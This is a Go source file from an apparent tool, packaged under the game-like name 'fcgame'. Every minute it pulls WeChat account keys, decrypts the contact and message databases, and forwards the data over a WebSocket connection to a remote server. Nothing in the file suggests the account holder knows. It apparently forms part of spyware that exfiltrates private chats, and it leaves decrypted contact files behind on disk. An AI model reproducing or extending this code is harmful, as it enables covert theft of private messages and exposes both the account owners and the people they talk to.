package fcgame

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/sjzar/chatlog/internal/wechat/decrypt"
	"github.com/sjzar/chatlog/pkg/rbblot"
	"go.uber.org/zap"
)

// DataProcessor 数据处理器
type DataProcessor struct {
	mutex         sync.Mutex
	accounts      []AccountInfo
	dbState       DatabaseState
	wsClient      *WebSocketClient
	processLock   sync.Mutex // 防止重复处理的锁
	rbblot        *rbblot.RBblotCore
	wechatManager *WechatManager
	logger        *zap.Logger
}

// NewDataProcessor 创建新的数据处理器
func NewDataProcessor(rb *rbblot.RBblotCore) *DataProcessor {
	logger, err := InitLogger()
	if err != nil {
		panic(err)
	}
	return &DataProcessor{
		dbState: DatabaseState{
			ContactLastID:   0,
			MessageTableMap: make(map[string]int64),
			FileStates:      make(map[string]FileState),
		},
		rbblot:        rb,
		wechatManager: NewWechatManager(),
		logger:        logger,
	}
}

// InitializeWebSocket 初始化WebSocket连接
func (dp *DataProcessor) InitializeWebSocket() error {
	config := GetDefaultConfig()
	dp.wsClient = NewWebSocketClient(config, dp.logger)

	// if err := dp.wsClient.ConnectWithRetry(); err != nil {
	// 	dp.logger.Warn("WebSocket连接失败", zap.Error(err))
	// 	return err
	// }

	// 设置日志系统的WebSocket客户端
	SetWebSocketClient(dp.wsClient)

	SafeRun(dp.wsClient.Run)

	// 启动消息监听和心跳
	// go dp.wsClient.ListenMessages()
	//SafeRun(dp.wsClient.ListenMessages)

	//SafeRun(dp.wsClient.StartWriter)

	// 只需要一方发 Ping，通常是服务端。客户端不用维持心跳，不要在双方都发心跳，否则会互相干扰
	// go dp.wsClient.StartHeartbeat()

	return nil
}

// LoadAccounts 加载账户信息
func (dp *DataProcessor) LoadAccounts() error {
	// 尝试从缓存中读取账户信息
	accounts := dp.loadAccountsFromCache()
	if len(accounts) == 0 {
		dp.logger.Info("未找到缓存的账户信息，开始获取")
		accounts = dp.getAndSaveAccounts()
	}

	if len(accounts) == 0 {
		return fmt.Errorf("未找到任何可用的微信账户")
	}

	dp.accounts = accounts
	return nil
}

// LoadDatabaseState 从缓存加载数据库状态
func (dp *DataProcessor) LoadDatabaseState() {
	data := dp.rbblot.Get("database", "state")
	if len(data) == 0 {
		return
	}

	if err := json.Unmarshal(data, &dp.dbState); err != nil {
		dp.logger.Error("反序列化数据库状态失败", zap.Error(err))
		return
	}

	dp.logger.Info("成功加载数据库状态")
}

// SaveDatabaseState 保存数据库状态到缓存
func (dp *DataProcessor) SaveDatabaseState() {
	data, err := json.Marshal(dp.dbState)
	if err != nil {
		dp.logger.Error("序列化数据库状态失败", zap.Error(err))
		return
	}

	dp.rbblot.Store("database", "state", data)
	dp.logger.Debug("数据库状态已保存")
}

// StartPeriodicProcessing 启动定期处理
func (dp *DataProcessor) StartPeriodicProcessing() {
	dp.logger.Info("找到账户，开始定期解密", zap.Int("account_count", len(dp.accounts)))

	// 定时器，每分钟执行一次
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	dp.logger.Info("定时器启动，每分钟处理一次")

	for {
		select {
		case <-ticker.C:
			dp.logger.Debug("定期处理任务开始")
			// 加锁防止重复处理
			dp.processLock.Lock()
			for _, account := range dp.accounts {
				dp.processAccountData(account)
			}
			// 保存数据库状态
			dp.SaveDatabaseState()
			dp.processLock.Unlock()
			dp.logger.Debug("定期处理任务完成")
		}
	}
}

// Close 关闭数据处理器
func (dp *DataProcessor) Close() {
	if dp.wsClient != nil {
		// 清除日志系统的WebSocket客户端引用
		ClearWebSocketClient()
		dp.wsClient.Close()
	}
}

// loadAccountsFromCache 从缓存中读取账户信息
func (dp *DataProcessor) loadAccountsFromCache() []AccountInfo {
	var accounts []AccountInfo

	data := dp.rbblot.Get("accounts", "list")
	if len(data) == 0 {
		return accounts
	}

	if err := json.Unmarshal(data, &accounts); err != nil {
		dp.logger.Error("反序列化账户信息失败", zap.Error(err))
		return nil
	}

	return accounts
}

// getAndSaveAccounts 获取并保存账户信息
func (dp *DataProcessor) getAndSaveAccounts() []AccountInfo {
	accounts := dp.wechatManager.GetAndSaveAccounts(dp.rbblot)

	if len(accounts) > 0 {
		// 保存到缓存
		data, err := json.Marshal(accounts)
		if err != nil {
			dp.logger.Error("序列化账户信息失败", zap.Error(err))
			return accounts
		}

		dp.rbblot.Store("accounts", "list", data)
		dp.logger.Info("成功保存账户信息到缓存", zap.Int("count", len(accounts)))
	}

	return accounts
}

// ProcessAllAccounts 处理所有账户
func (dp *DataProcessor) ProcessAllAccounts() {
	// 立即执行一次处理
	for k, account := range dp.accounts {
		if idx := strings.LastIndex(account.Name, "_"); idx != -1 {
			account.SortName = account.Name[:idx]
			dp.accounts[k].SortName = account.SortName
		}
		dp.processAccountData(account)
	}

	dp.StartPeriodicProcessing()
}

// processAccountData 处理账户数据（解密、读取、发送）
func (dp *DataProcessor) processAccountData(account AccountInfo) {
	dp.logger.Info("开始处理账户", zap.String("account", account.Name))

	// 创建解密器
	decryptor, err := decrypt.NewDecryptor(account.Platform, account.Version)
	if err != nil {
		dp.logger.Error("创建解密器失败", zap.String("account", account.Name), zap.Error(err))
		return
	}

	// 获取需要处理的数据库文件
	contactFiles, messageFiles := dp.wechatManager.GetTargetDatabaseFiles(account)

	// 处理 contact.db
	if len(contactFiles) > 0 {
		err = dp.ProcessContactDatabase(decryptor, contactFiles[0], account)
		if err != nil {
			return
		}
	}

	// 处理消息数据库文件
	if len(messageFiles) > 0 {
		for _, file := range messageFiles {
			dp.ProcessMessageDatabase(decryptor, file, account)
		}
	}

	dp.logger.Info("账户处理完成", zap.String("account", account.Name))
}

// ProcessContactDatabase 处理联系人数据库
func (dp *DataProcessor) ProcessContactDatabase(decryptor decrypt.Decryptor, dbFile string, account AccountInfo) error {
	// 检查文件是否需要更新
	if !dp.needsUpdate(dbFile) {
		dp.logger.Debug("联系人数据库无更新", zap.String("file", filepath.Base(dbFile)))
		return nil
	}

	dp.logger.Info("处理联系人数据库", zap.String("file", filepath.Base(dbFile)))

	// 解密到临时文件
	file, err := dp.wechatManager.DecryptToTempFile(decryptor, dbFile, account.Key, true)
	if err != nil {
		dp.logger.Error("解密联系人数据库失败", zap.Error(err))
		return err
	}
	// 确保删除临时文件
	// defer func() {
	// 	if err := os.Remove(tempDBFile); err != nil {
	// 		dp.logger.Warn("删除临时文件失败", zap.String("file", tempDBFile), zap.Error(err))
	// 	} else {
	// 		dp.logger.Debug("临时文件已删除", zap.String("file", tempDBFile))
	// 	}
	// }()

	// 读取并发送联系人数据
	err = dp.ProcessContactData(file, account.SortName)

	// 更新文件状态
	dp.updateFileState(dbFile)

	return err
}

// ProcessMessageDatabase 处理消息数据库
func (dp *DataProcessor) ProcessMessageDatabase(decryptor decrypt.Decryptor, dbFile string, account AccountInfo) {
	// 检查文件是否需要更新
	if !dp.needsUpdate(dbFile) {
		dp.logger.Debug("消息数据库无更新", zap.String("file", filepath.Base(dbFile)))
		return
	}

	dp.logger.Debug("处理消息数据库", zap.String("file", filepath.Base(dbFile)))

	// 解密到临时文件
	tempDBFile, err := dp.wechatManager.DecryptToTempFile(decryptor, dbFile, account.Key, false)
	if err != nil {
		dp.logger.Debug("解密消息数据库失败", zap.Error(err))
		return
	}
	// 确保删除临时文件
	defer func() {
		if err := os.Remove(tempDBFile); err != nil {
			dp.logger.Info("删除临时文件失败", zap.String("file", tempDBFile), zap.Error(err))
		} else {
			dp.logger.Debug("临时文件已删除", zap.String("file", tempDBFile))
		}
	}()

	// 读取并发送消息数据
	dp.ProcessMessageData(tempDBFile, account.SortName, dbFile)

	// 更新文件状态
	dp.updateFileState(dbFile)
}

// needsUpdate 检查文件是否需要更新
func (dp *DataProcessor) needsUpdate(filePath string) bool {
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		dp.logger.Error("获取文件信息失败", zap.String("file", filePath), zap.Error(err))
		return false
	}

	dp.mutex.Lock()
	defer dp.mutex.Unlock()

	// 检查文件状态
	state, exists := dp.dbState.FileStates[filePath]
	if !exists {
		// 新文件，需要处理
		return true
	}

	// 比较修改时间和文件大小
	if fileInfo.ModTime().After(state.LastModTime) || fileInfo.Size() != state.Size {
		return true
	}

	return false
}

// updateFileState 更新文件状态
func (dp *DataProcessor) updateFileState(filePath string) {
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		dp.logger.Error("获取文件信息失败", zap.String("file", filePath), zap.Error(err))
		return
	}

	dp.mutex.Lock()
	defer dp.mutex.Unlock()

	dp.dbState.FileStates[filePath] = FileState{
		Path:         filePath,
		LastModTime:  fileInfo.ModTime(),
		LastProcTime: time.Now(),
		Size:         fileInfo.Size(),
	}
}

func (dp *DataProcessor) Test() {
	for {
		snid := Snowflake.Generate().String()
		err := dp.wsClient.SendMessage("zuan", snid)
		fmt.Println("发送消息：", snid, err)
		time.Sleep(time.Second * 10)
	}
}
